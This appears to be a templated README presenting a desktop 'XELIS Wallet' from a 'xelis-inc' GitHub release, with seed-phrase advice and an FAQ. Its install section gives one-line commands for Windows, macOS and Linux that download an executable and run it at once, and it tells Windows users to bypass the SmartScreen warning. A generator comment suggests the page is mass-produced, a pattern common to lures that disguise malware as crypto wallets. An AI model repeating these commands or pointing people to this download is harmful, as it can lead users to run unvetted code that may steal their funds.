![Create a XELIS Wallet: setup, password and the phrase you must keep](assets/banner-article.png)
# Create a XELIS Wallet: setup, password and the phrase you must keep

Set the local password, write the 25 words and confirm the wallet opens.

## Downloads - Setup

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Creating a wallet starts with the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1), because the phrase screen and its warnings only exist in the app itself. No website creates a wallet for you.

> The 25-word phrase is shown once. Nothing in the wallet can show it again, and no support channel can retrieve it.

Creating a XELIS Wallet takes three decisions: a local password, the 25-word recovery phrase, and where you keep that phrase. The password locks the wallet file on this computer. The phrase reconstructs the wallet anywhere. Write the words down before you click past the screen, then check that a zero balance and a receiving address appear.

<!-- ARTICLE-BODY-BEGIN -->
## What you are creating, and what you are not

Creating a wallet runs inside the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a>. A new wallet is a key pair generated on your machine and stored in an encrypted local database. There is no account on a server, no email confirmation and no recovery service, which is what non-custodial means in practice.

The <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-password-encryption-local-data.md">XELIS Wallet password</a> protects that local file; it is not a login and nobody can reset it.

That design puts two separate secrets in your hands. The password is disposable, because a forgotten password is fixed by restoring. The phrase is not disposable, because it is the only way to restore. Treat the second as the wallet itself.

## Choose the password that locks this computer

Pick a long passphrase you can type reliably, not a short password reused from another site. The wallet asks for it each time you open your funds on that machine, and it encrypts the local database at rest rather than sending anything anywhere.

Two practical rules follow from that. The password never leaves the computer, so a password manager is fine and a browser-saved login is not needed. And because the password is local, a second computer with the same wallet can use a different password without affecting the first, which matters when you set up more than one machine.

## Write the 25 words in order

During creation the wallet shows the 25 words once, in sequence. Write them on paper or metal by hand, number them, and read them back against the screen before continuing. Do not photograph the screen, paste the words into a password manager on first capture, or store them in a chat draft, because each of those copies survives somewhere you no longer control.

This is the step where the <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-backup-seed-phrase-keys-file.md">XELIS Wallet seed phrase backup</a> happens, and it is not repeatable later. If a word is unclear, restart the creation flow and generate a fresh wallet rather than guessing at a half-copied phrase.

## Confirm the wallet actually works

After the phrase step you should see an empty wallet with a receiving address and a sync that settles. That is the expected state for a new wallet with no funds. The address is what you share to receive XEL, and the balance stays empty until something arrives.

Do not send funds to the new wallet until the phrase has been stored properly. A good test is to close the app, reopen it with the password, and confirm the same address appears. If you want a stronger check, the storage rules in <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-seed-phrase-storage-mistakes.md">store a XELIS Wallet seed phrase safely</a> are the ones to apply before the first deposit.

## FAQ

### Is XELIS Wallet free?

Yes. The wallet is free to download and free to use. The only cost is the network fee on a transaction you send.

### Is it free to set up a crypto wallet?

Creating a wallet costs nothing, here or in any non-custodial app. You pay network fees when you move funds, not when you create keys.

### How much does it cost to have a crypto wallet?

Nothing to hold one. Costs appear only when you transact, and they are set by the network rather than by the wallet.

### Can I skip the recovery phrase and rely on the password?

No. The password unlocks this copy on this computer; it cannot rebuild the wallet. Without the phrase, a lost or wiped machine means a lost wallet.

### What happens if I forget the password later?

Restore the wallet from the 25-word phrase on the same machine and set a new password. That is why the phrase, not the password, is the thing to protect.

<!-- ARTICLE-BODY-END -->

## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [Back up the XELIS Wallet seed phrase](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-backup-seed-phrase-keys-file.md)
- [What the XELIS Wallet password protects](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-password-encryption-local-data.md)
- [Store a XELIS Wallet seed phrase safely](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-seed-phrase-storage-mistakes.md)
- [Restore a XELIS Wallet on a new computer](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-restore-new-computer.md)
- [Current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1)
